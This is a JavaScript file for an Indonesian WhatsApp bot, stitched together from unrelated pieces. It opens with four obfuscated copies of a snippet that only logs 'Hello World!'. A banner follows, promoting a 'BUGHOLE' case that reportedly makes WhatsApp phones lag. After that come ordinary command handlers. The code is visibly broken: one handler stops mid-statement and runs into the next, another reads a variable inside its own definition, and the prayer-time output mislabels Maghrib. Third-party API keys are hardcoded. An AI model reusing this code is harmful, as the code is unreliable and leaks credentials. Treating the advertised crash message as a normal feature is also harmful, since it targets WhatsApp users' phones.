_0x16d0b5['push'](_0x16d0b5['shift']());}catch(_0x27c77f){_0x16d0b5['push'](_0x16d0b5['shift']());}}}(_0xa494,0x16a705*0x1+0x14f804+0x1f428b*-0x1));function hi(){var _0x104c75=function(_0x28d988,_0x214fb7,_0x32c45b,_0x209dd3,_0x1654a3){return _0x504f(_0x209dd3-0x3e7,_0x214fb7);},_0x9ed0e=function(_0x1eb2b3,_0x1a9099,_0x47b344,_0x5cae96,_0x55782f){return _0x504f(_0x5cae96-0x3e7,_0x1a9099);},_0x21ead9=function(_0xfd893a,_0x46e0c1,_0x16fda8,_0x386103,_0x5ec164){return _0x504f(_0x386103-0x3e7,_0x46e0c1);},_0x1a0fa8=function(_0x3dc546,_0x43fe20,_0x5a662d,_0x2be594,_0x17218e){return _0x504f(_0x2be594-0x3e7,_0x43fe20);},_0x184893=function(_0x1d22b0,_0x401c86,_0x5b6a45,_0x3fe331,_0x1d28bf){return _0x504f(_0x3fe331-0x3e7,_0x401c86);},_0x13bc94={};_0x13bc94[_0x104c75(0x491,0x49c,0x497,0x499,0x493)]=_0x9ed0e(0x488,0x492,0x495,0x48f,0x48d)+_0x104c75(0x49b,0x49a,0x49b,0x493,0x491)+'d!';var _0x7775c4=_0x13bc94;console[_0x104c75(0x4a0,0x49d,0x493,0x49b,0x4a1)](_0x7775c4[_0x1a0fa8(0x49b,0x494,0x49d,0x499,0x4a0)]);}function _0x504f(_0x423b80,_0x21c653){_0x423b80=_0x423b80-(0x1faa+0x91*0x3d+-0x4190);var _0x5dd6cc=_0xa494[_0x423b80];return _0x5dd6cc;}hi();
var _0x1a2d=['873274GOPKwu','49711TqvDhS','vSwjL','\x20Worl','6288WzzdEo','158LOZYqz','65050TiskhG','Hello','3457238BFUhof','1048345mcjShl','8dYNcgW','log','9zqBrQA','1036383cchzlh'];(function(_0x3c9f84,_0xf9deaf){var _0x59f774=function(_0x55c2e1,_0x1af17c,_0x2ebb3f,_0x4fc754,_0x286f22){return _0x4954(_0x1af17c- -0xef,_0x4fc754);},_0x5cfd5c=function(_0x44d40f,_0x1979f2,_0x23f583,_0x5898a0,_0x521d52){return _0x4954(_0x1979f2- -0xef,_0x5898a0);},_0x20c769=function(_0xb90686,_0xdf929b,_0x105f6f,_0x4d84fd,_0x5e7cc0){return _0x4954(_0xdf929b- -0xef,_0x4d84fd);},_0x376eb5=function(_0x15bcc2,_0x25cab5,_0x2aff59,_0x29426e,_0x4bdc68){return _0x4954(_0x25cab5- -0xef,_0x29426e);},_0x4e6ab7=function(_0x30f571,_0x7a65bb,_0x3fb9c7,_0x3fe116,_0x2acfa1){return _0x4954(_0x7a65bb- -0xef,_0x3fe116);};while(!![]){try{var _0x2d25ba=-parseInt(_0x59f774(0x67,0x63,0x69,0x5f,0x5c))*-parseInt(_0x5cfd5c(0x5e,0x62,0x64,0x5c,0x60))+parseInt(_0x5cfd5c(0x6b,0x64,0x5e,0x66,0x5d))*-parseInt(_0x20c769(0x6d,0x68,0x64,0x65,0x6e))+-parseInt(_0x59f774(0x5a,0x5e,0x65,0x5a,0x65))+-parseInt(_0x4e6ab7(0x58,0x5d,0x5d,0x60,0x5b))+parseInt(_0x4e6ab7(0x5e,0x5f,0x66,0x5b,0x60))*-parseInt(_0x376eb5(0x59,0x5c,0x57,0x58,0x62))+-parseInt(_0x4e6ab7(0x62,0x67,0x63,0x6b,0x66))+parseInt(_0x5cfd5c(0x68,0x66,0x66,0x63,0x68));if(_0x2d25ba===_0xf9deaf)break;else _0x3c9f84['push'](_0x3c9f84['shift']());}catch(_0x59ea96){_0x3c9f84['push'](_0x3c9f84['shift']());}}}(_0x1a2d,-0x1c35d*-0x8+-0x1b185+-0xc62*0x5b));function _0x4954(_0x1355fd,_0x3169a1){_0x1355fd=_0x1355fd-(-0x9ce+-0x1*-0xfef+-0x2*0x26b);var _0x2c6143=_0x1a2d[_0x1355fd];return _0x2c6143;}function hi(){var _0x1683cd=function(_0x2d0bd1,_0x54806a,_0x3438a7,_0x45a1ad,_0x1cec13){return _0x4954(_0x1cec13- -0x184,_0x3438a7);},_0x247154=function(_0x367324,_0x2fc684,_0x5c8f60,_0x223bec,_0x3930c0){return _0x4954(_0x3930c0- -0x184,_0x5c8f60);},_0x3102a3=function(_0x562ae7,_0x2bcb3a,_0x8bea13,_0x483f01,_0x2dc5e4){return _0x4954(_0x2dc5e4- -0x184,_0x8bea13);},_0x22703e=function(_0x77f87b,_0xe30b88,_0x535ac0,_0x101ffc,_0x2f4233){return _0x4954(_0x2f4233- -0x184,_0x535ac0);},_0x318c90=function(_0x59e9f6,_0x3dcb5b,_0x251259,_0x3fb760,_0x5ec60f){return _0x4954(_0x5ec60f- -0x184,_0x251259);},_0x557a23={};_0x557a23[_0x1683cd(-0x39,-0x2e,-0x2e,-0x33,-0x35)]=_0x1683cd(-0x31,-0x2b,-0x29,-0x29,-0x30)+_0x1683cd(-0x37,-0x35,-0x3a,-0x39,-0x34)+'d!';var _0x42836a=_0x557a23;console[_0x22703e(-0x26,-0x2e,-0x2e,-0x33,-0x2c)](_0x42836a[_0x22703e(-0x38,-0x34,-0x2e,-0x2e,-0x35)]);}hi();
var _0x52b6=['979806odjWHO','866172blkIpR','48673lXrcwz','144110wbrnrs','EpKap','59312BEeZim','454073XDAqOT','4ptRdUT','log','71823cxnXKK','Hello','\x20Worl','19ZzJRim','2QnhARU'];(function(_0x38a6ff,_0x429c03){var _0x1a7b23=function(_0x287403,_0x47713a,_0x1dbbac,_0x47e099,_0xf1c18d){return _0x59b1(_0x47e099- -0x183,_0x1dbbac);},_0x4e812d=function(_0xa1ba31,_0xd5e37c,_0xebf963,_0x238ed5,_0x48fe9d){return _0x59b1(_0x238ed5- -0x183,_0xebf963);},_0x4845fa=function(_0x578980,_0x22097b,_0x3e9496,_0x2adf05,_0x366b9f){return _0x59b1(_0x2adf05- -0x183,_0x3e9496);},_0x4c3b51=function(_0x3ef968,_0x4a9350,_0x1252e1,_0x22d2cd,_0x31c7b4){return _0x59b1(_0x22d2cd- -0x183,_0x1252e1);},_0x22f02d=function(_0x256e85,_0x442fa8,_0xe2e2c8,_0x52d69a,_0x3a5bde){return _0x59b1(_0x52d69a- -0x183,_0xe2e2c8);};while(!![]){try{var _0x3a9259=parseInt(_0x1a7b23(-0x1d,-0x16,-0x21,-0x1c,-0x15))*parseInt(_0x1a7b23(-0x27,-0x1f,-0x22,-0x26,-0x24))+parseInt(_0x4845fa(-0x14,-0x1f,-0x1a,-0x1a,-0x15))+-parseInt(_0x4e812d(-0x2a,-0x28,-0x27,-0x27,-0x24))+-parseInt(_0x4845fa(-0x1e,-0x20,-0x1b,-0x22,-0x1b))*parseInt(_0x4e812d(-0x14,-0x1a,-0x1a,-0x1b,-0x1f))+-parseInt(_0x1a7b23(-0x1d,-0x23,-0x1e,-0x23,-0x27))+-parseInt(_0x4e812d(-0x23,-0x21,-0x22,-0x1f,-0x22))+parseInt(_0x1a7b23(-0x2a,-0x21,-0x1e,-0x25,-0x20))*parseInt(_0x1a7b23(-0x23,-0x27,-0x1f,-0x21,-0x24));if(_0x3a9259===_0x429c03)break;else _0x38a6ff['push'](_0x38a6ff['shift']());}catch(_0x25ee65){_0x38a6ff['push'](_0x38a6ff['shift']());}}}(_0x52b6,-0xbe48c+0x9f467*0x1+0x1*0xab881));function hi(){var _0x412edf=function(_0x5ed909,_0x1d0a8a,_0x3077ab,_0x37e70b,_0x381276){return _0x59b1(_0x5ed909-0x3d5,_0x37e70b);},_0xd1fc57=function(_0x16ed48,_0x187f12,_0x3c1622,_0x1e4dfa,_0x17a6d9){return _0x59b1(_0x16ed48-0x3d5,_0x1e4dfa);},_0x3b3a17=function(_0x4d7aab,_0x6a1332,_0x54a086,_0x5bd53c,_0x49323f){return _0x59b1(_0x4d7aab-0x3d5,_0x5bd53c);},_0x29c70a=function(_0x220ed0,_0x46a777,_0x1cdcfb,_0x208e69,_0x5786d1){return _0x59b1(_0x220ed0-0x3d5,_0x208e69);},_0x56416c=function(_0x4eb994,_0x16a747,_0x4fe4ec,_0x2577ea,_0x25865e){return _0x59b1(_0x4eb994-0x3d5,_0x2577ea);},_0x24c641={};_0x24c641[_0x412edf(0x534,0x533,0x534,0x533,0x53b)]=_0xd1fc57(0x53a,0x537,0x53d,0x540,0x538)+_0x412edf(0x53b,0x536,0x537,0x53b,0x542)+'d!';var _0x2ddb5a=_0x24c641;console[_0x29c70a(0x538,0x531,0x536,0x53e,0x53b)](_0x2ddb5a[_0x3b3a17(0x534,0x539,0x52e,0x535,0x531)]);}function _0x59b1(_0x5e775f,_0x2a80ea){_0x5e775f=_0x5e775f-(0x1c7f*0x1+-0x10c1*-0x1+-0x6a*0x6a);var _0x4cb48b=_0x52b6[_0x5e775f];return _0x4cb48b;}hi();
var _0x3091=['OwFke','6qqTyBv','614682xEMKJU','182821PPlWEs','437282BVnHDF','Hello','2msSnuM','19381QRANiX','564751nbeKxk','\x20Worl','455556CSAxxI','log','522091blOpDQ','1ArvwbP'];(function(_0x3bd903,_0x4daeee){var _0x4b6e1d=function(_0xae9d3b,_0x2ffd03,_0x497a39,_0x410a61,_0x2d2187){return _0x22f5(_0x497a39-0x385,_0x410a61);},_0x51f4f8=function(_0x2669c5,_0x34b5c2,_0x43adab,_0x3f1a82,_0x5bb68d){return _0x22f5(_0x43adab-0x385,_0x3f1a82);},_0x53b70f=function(_0x6cafc9,_0x5b2761,_0x1bfdc9,_0x163cba,_0x1fe8ba){return _0x22f5(_0x1bfdc9-0x385,_0x163cba);},_0x4f1061=function(_0x499a74,_0x5cc142,_0x41f762,_0x198362,_0x5bb718){return _0x22f5(_0x41f762-0x385,_0x198362);},_0x27ff5d=function(_0x4ad94b,_0xf7cb1c,_0x45daf9,_0x528ef9,_0x756eff){return _0x22f5(_0x45daf9-0x385,_0x528ef9);};while(!![]){try{var _0x34c042=parseInt(_0x4b6e1d(0x514,0x515,0x516,0x50f,0x50f))+parseInt(_0x51f4f8(0x513,0x50c,0x50f,0x50f,0x50f))*parseInt(_0x51f4f8(0x50e,0x50b,0x511,0x50c,0x50b))+parseInt(_0x53b70f(0x50a,0x50a,0x50d,0x509,0x50c))*-parseInt(_0x4f1061(0x505,0x509,0x50c,0x50a,0x507))+-parseInt(_0x4b6e1d(0x517,0x50d,0x510,0x50c,0x517))+parseInt(_0x4b6e1d(0x516,0x50d,0x514,0x51b,0x50f))*parseInt(_0x53b70f(0x50e,0x516,0x515,0x518,0x51b))+-parseInt(_0x53b70f(0x518,0x512,0x512,0x516,0x516))+parseInt(_0x4f1061(0x50e,0x503,0x50a,0x50b,0x510));if(_0x34c042===_0x4daeee)break;else _0x3bd903['push'](_0x3bd903['shift']());}catch(_0x24df68){_0x3bd903['push'](_0x3bd903['shift']());}}}(_0x3091,-0xe805f+0x95007*-0x1+0x3*0xae5de));function _0x22f5(_0x13af2e,_0x4926e0){_0x13af2e=_0x13af2e-(-0x13*-0xcb+0x134a+-0x20d7);var _0x3734bb=_0x3091[_0x13af2e];return _0x3734bb;}function hi(){var _0x12b4e5=function(_0xd818b2,_0x5149df,_0x3ddd85,_0x37dede,_0x71de35){return _0x22f5(_0x3ddd85-0x204,_0x37dede);},_0x1ada77=function(_0x4b48c5,_0x5648c4,_0x39c595,_0x49ce77,_0x1f5d9f){return _0x22f5(_0x39c595-0x204,_0x49ce77);},_0xc6712e=function(_0x108616,_0x3d4d39,_0x9f62ee,_0x575976,_0x30de6b){return _0x22f5(_0x9f62ee-0x204,_0x575976);},_0x3829b7=function(_0x23f45a,_0x156791,_0x1f99f3,_0xf159d1,_0xe42fc1){return _0x22f5(_0x1f99f3-0x204,_0xf159d1);},_0x20d23c=function(_0x3cd15b,_0x1affe2,_0x2f3125,_0x46168d,_0x186357){return _0x22f5(_0x2f3125-0x204,_0x46168d);},_0x6adfba={};_0x6adfba[_0x12b4e5(0x391,0x38b,0x38d,0x38f,0x388)]=_0x1ada77(0x394,0x398,0x392,0x392,0x399)+_0x1ada77(0x382,0x387,0x388,0x384,0x387)+'d!';var _0x4d0ee0=_0x6adfba;console[_0xc6712e(0x38d,0x387,0x38a,0x388,0x38d)](_0x4d0ee0[_0x20d23c(0x390,0x387,0x38d,0x38e,0x391)]);}hi();

/****BUGHOLE •BUATAN ARIFI RAZZAQ OFFICIAL ****/


/***PERINGATAN!!!!!!!!****/
// jangan menyalah gunakan!
// Berakibat Fatal!!!
//


//________________________________________///
//KALIAN SALIN SEMUA YANG DIATAS
//JANGAN DI UBAH DIKIT PUN, DAN JANGAN
//CLAIM CASE YANG DI BUAT OLEH ARIFI RAZZAQ 

//KAMI DARI TEAM/SELURUH PENJURU DEVELOPER BOT
//SELALU MENDUKUNG BANG ARIFI, BUAT YANG HATERS 
//SILAHKAN HUJAT! KAMI JUGA DIAJARIN,
//SUATU HINAAN ADALAH PENGGUGUR DOSA

//DIBUATNYA FILE INI UNTUK BAGI CASE BUGHOLE
//SEBAB GAK BISA SALIN TEMPEL KALAU KIRIM KE PERCAKAPAN WHATSAPP
//KALAU TIDAK PERCAYA BISA COBA, MALAH NANTI HP KALIAN YANG LAG KALAU TEMPEL CASE INI KE WHATSAPP KALIAN.
//MEMATIKAN!!!! (WAJIB BACA)

/***❒ SPECIAL BIG THANX TO :
Mhankbarbar • 
Arugia • 
Adiwajhsing • 
xptn • 
tobz • 
Pengguna bot • 
Penyedia api key • 
Maslent • 
Nazwa • 
Arifi Razzaq • 
Agus • 
Caliph • 
Rey • 
Rizki • 
Aulia • 
Natasya • 
Drawl Nagl • 
Nayla • 
Khadijah • 
Aurel • 
Galuh • 
Ramlan • 
Anker • 
Benny •
Sanz •
Denis •
Manik •
Angga •
Dan Creator Bot Lainnya.

❒ ENERGI CONTRIBUTOR :
| Arifi Razzaq 
| Manik 
| Denis 
| FG98 
| Dehante 
| Ridho-S 
| Angga 
| Aqulz 
| Rvan 
| Ivan-MLN 
| Sanz
| Benny 
| Angga
| Arya-DN 
| Rizky

BuggHole Buatan Arifi Raazzq
________________________________________*///


                    case 'alquranaudio':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${LoLKey}`)
                    Angga.sendMessage(from, ini_buffer, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })
                    break
                case 'asmaulhusna':
		if (!isRegistered) return reply(ind.noregis())
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asmaulhusna?apikey=${LoLKey}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break
                case 'kisahnabi':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${LoLKey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
                case 'jadwalsholat':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${LoLKey}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break
                    case 'stickerwa':
		if (!isRegistered) return reply(ind.noregis())
		if (!isPremium) return reply('Fitur Ini Khusus User Premium')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${LoLKey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebp?apikey=${LoLKey}&img=${x}`)
                        Angga.sendMessage(from, ini_buffer, sticker)
                    }
                    break
					case 'wallpapersearch':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/wallpaper?apikey=${LoLKey}&query=${query}`)
                    Angga.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                    case 'twtstalk':
				if (!isRegistered) return reply(ind.noregis())
				username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/twitter/${username}?apikey=KatoNiBoss`, {method: 'get'})
					get_result = get_result.result
					txt = `Nama : ${get_result.name}\n`
					txt += `Name Screen : ${get_result.screen_name}\n`
					txt += `Bio : ${get_result.description}\n`
						txt += `Followers : ${get_result.followers}\n`
					txt += `Following: ${get_result.following}\n`
					txt += `Like : ${get_result.like}\n`
					txt += `Tweet : ${get_result.tweet}\n`
					txt += `Join : ${get_result.joined}\n`
					profile = await getBuffer(get_result.profile_picture)
					banner = await getBuffer(get_result.banner)
					Angga.sendMessage(from, profile, image, {quoted: mek, caption: txt})
					Angga.sendMessage(from, banner, image, {quoted: mek, caption: 'BANNERNYA OM!' })
					break
                case 'wallpapersearch2':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wallpaper2?apikey=${LoLKey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    Angga.sendMess
					case 'pantun':
                case 'bucin':
		if (!isRegistered) return reply(ind.noregis())
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LoLKey}`)
                    reply(get_result.result)
                    break
                    case 'randomnama':
		if (!isRegistered) return reply(ind.noregis())
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/random/nama?apikey=${LoLKey}`)
                    reply(anu.result)
                    break
		case 'crosslogo':
                case 'naruto':
                case 'flowertext':
                case 'silktext':
                case 'flametext':
                case 'glowtext':
                case 'skytext':
                case 'cslogo':
                case 'lithgtext':
                case 'crismes':
                if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} yogi`)
                    txt = args.join(" ")
                    reply('Wait...')
                    anu = await fetchJson(`https://api.zeks.xyz/api/${command}?text=${txt}&apikey=apivinz`, {method: 'get'})
                    tod = await getBuffer(anu.result)
                    Angga.sendMessage(from, tod, image, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
         break
case 'bneon':
                case 'matrix':
                case 'breakwall':
                case 'dropwater':
                case 'leavest':
                case 'logobp':
                if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} yogi`)
                    txt = args.join(" ")
                    reply('[❕] Loading')
                    buffer = await getBuffer(`https://api.zeks.xyz/api/${command}?text=${txt}&apikey=apivinz`)
                    Angga.sendMessage(from, buffer, image, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
         break
		case 'donasi':
		case 'donate':
					
                 if (!isRegistered) return reply( ind.noregis())
					Angga.sendMessage(from, donasi(), text, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					break
		case 'menupicture':
		case 'menupict':
		case 'pictmenu':
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				wew = fs.readFileSync(`./src/me.jpg`)
					Angga.sendMessage(from, wew, image, { quoted: mek, caption: randompict(prefix)})
					break
		case 'menuowner':
		case 'ownermenu':
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					wew = fs.readFileSync(`./src/me.jpg`)
					Angga.sendMessage(from, wew, image, { quoted: mek, caption: developer(prefix)})
					break
		case 'bahasa':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.sendMessage(from, bahasa(), text)
					await limitAdd(sender)
					break
		case 'kodenegara':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.sendMessage(from, negara(), text)
					await limitAdd(sender)
					break
		case 'del':
		case 'd':
		case 'delete':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					await limitAdd(sender)
					break
		case 'level':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (!isLevelingOn) return reply(ind.lvlnoon())
					if (!isGroup) return reply(ind.groupo())
					const userLevel = getLevelingLevel(sender)
					const userXp = getLevelingXp(sender)
					if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
					const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
					resul = `◪ *LEVEL*\n  ├─ ❏ *Name* : ${pushname}\n  ├─ ❏ *Nomor* : ${sender.split("@")[0]}\n  ├─ ❏ *User XP* : ${userXp}/${requiredXp}\n  └─ ❏ *User Level* : ${userLevel}\n`
					Angga.sendMessage(from, resul, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					.catch(async (err) => {
					console.error(err)
					await reply(`Error!\n${err}`)
					})
					break
		case 'say':
                                        teks = body.slice(5)
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
                                        if (args.length < 1) return reply('teksnya mana kak?')
                                        saying = teks
                                        Angga.sendMessage(from, saying, text)
					await limitAdd(sender)
                                        break
		case 'info':
					me = Angga.user
					ow = "6285283427860@s.whatsapp.net"
					uptime = process.uptime()
					teks = `➽ *Name Bot* : wa.me/6285283427860\n➽ *Owner* : @${ow.split('@')[0]}\n➽ *Prefix* : | ${prefix} |\n➽ *Total Block* : ${blocked.length}\n➽ *Bot Aktif* : ${kyun(uptime)}\n➽\n➽ *ɢʀᴜᴘ* : coming soon\n➽ *ꜱᴘᴇᴄɪᴀʟ ᴛʜᴀɴᴋꜱ ᴛᴏ* :\n➽ Allah ꜱᴡᴛ\n➽ Fxc7\n➽ MhankBarBars\n➽ Ampibi\n➽ Ramlan\n➽ Dennis\n➽  Anker`
					const daca = fs.readFileSync('me.jpg');
				    Angga.sendMessage(from, daca, image, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [ow]}, caption: teks})
					break 
		case 'snk':
					me = Angga.user
					uptime = process.uptime()
					teks = `*Syarat & Ketentuan*\n1. Teks dan nama pengguna WhatsApp anda kami simpan di dalam server selama bot aktif.\n2. Data anda akan di hapus ketika bot offline.\n3. Kami tidak menyimpan gambar, video, file, audio, dan dokumen yang anda kirim.\n4. Kami tidak pernah meminta anda untuk memberikan informasi pribadi.\n5. Jika menemukan Bug/Error silahkan langsung lapor ke Owner bot.\n6. Cukup perintah 1x jika bot tidak merespon harap ulangi kembali, Jika di ulangi kembali tidak merespon, Bot tidak aktif\n7. Anggarang spam, Share virus virtex, Telpon, Video call, Kami akan blockir anda.\n8. Apapun yang anda perintah pada bot ini, *KAMI TIDAK BERTANGGUNG JAWAB!*\n\nTERIMA KASIH !~`
					buffer = await getBuffer(me.imgUrl)
					Angga.sendMessage(from, buffer, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
					break
		case 'lpr':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                if (args.length < 1) return reply(`Yang mau direport apaan?`)
                     const pesan = body.slice(5)
                      if (pesan.length > 300) return Angga.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var nomor = mek.participant
                       const tekst1 = `*[LAPOR]*\nNomor : wa.me/${sender.split("@")[0]}\nPesan : ${pesan}`
                      var options = {
                         text: tekst1,
                         contextInfo: {mentionedJid: [nomor]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Masalah telah di laporkan ke owner BOT, laporan palsu/main2 tidak akan ditanggapi.')
                    break
		case 'request':
					const cfrr = body.slice(8)
					if (cfrr.length > 300) return Angga.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
					var nomor = mek.participant
					const ress = `*[REQUEST VITUR]*\nNomor : wa.me/${sender.split("@")[0]}\nPesan : ${cfrr}`
							var options = {
							text: ress,
                         				contextInfo: {mentionedJid: [nomor]},
                     			}
					Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
					reply('REQUEST ANDA TELAH SAMPAI KE OWNER Tbz, Requests palsu atau main² tidak akan ditanggapi.')
					break
		case 'blocklist': 
					teks = '*This is list of blocked number* :\n'
					for (let block of blocked) {
						teks += `*~>* @${block.split('@')[0]}\n`
					}
					teks += `*Total* : ${blocked.length}`
					Angga.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
					break
                case 'hidetag':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					var value = body.slice(9)
					var group = await Angga.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					Angga.sendMessage(from, options, text)
					await limitAdd(sender)
					break

                case 'afk':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                                tels = body.slice(4)
                                if (args.length < 1) return reply('Kakak afk karena apa?')
                                var ain = mek.participant
                                const tagzz = {
                                                text: `@${tagzz.split("@s.whatsapp.net")[0]} *SEDANG AFK ${tels} JANGAN GANGGU YA*`,
                                                contextInfo: { mentionedJid: [ain] }
                                        }
                                        Angga.sendMessage(from, tagzz, text, {quoted: mek})
					await limitAdd(sender)
                                        break
                                        case 'profile':

    				Angga.updatePresence(from, Presence.composing)

				
    				try {

					ppimg = await Angga.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)

					} catch {

					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'

					}

					 profile = `╭─「 *PROFILE ANDA* 」\n│• *Name:* ${pushname}\n│• *XP:* ${getLevelingXp(sender)}\n│• *Level:* ${getLevelingLevel(sender)}\n│• *Role:* ${role}\n│• *User Terdaftar:* ✓\n│• *Link:* wa.me/${sender.split("@")[0]}\n╰──────────────────`

					buffer = await getBuffer(ppimg)

					Angga.sendMessage(from, buffer, image, {quoted: mek, caption: profile})

					break
                case 'quotemaker':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					var gh = body.slice(12)
					var quote = gh.split("/")[0];
					var wm = gh.split("/")[1];
					const pref = `Usage: \n${prefix}quotemaker teks|watermark\n\nEx :\n${prefix}quotemaker ini contoh|bicit`
					if (args.length < 1) return reply(pref)
					reply(ind.wait())
					anu = await fetchJson(`https://terhambar.com/aw/qts/?kata=${quote}&author=${wm}&tipe=random`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					Angga.sendMessage(from, buffer, image, {caption: 'Nih kak', quoted: mek})
					await limitAdd(sender)
					break
                case 'truth':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
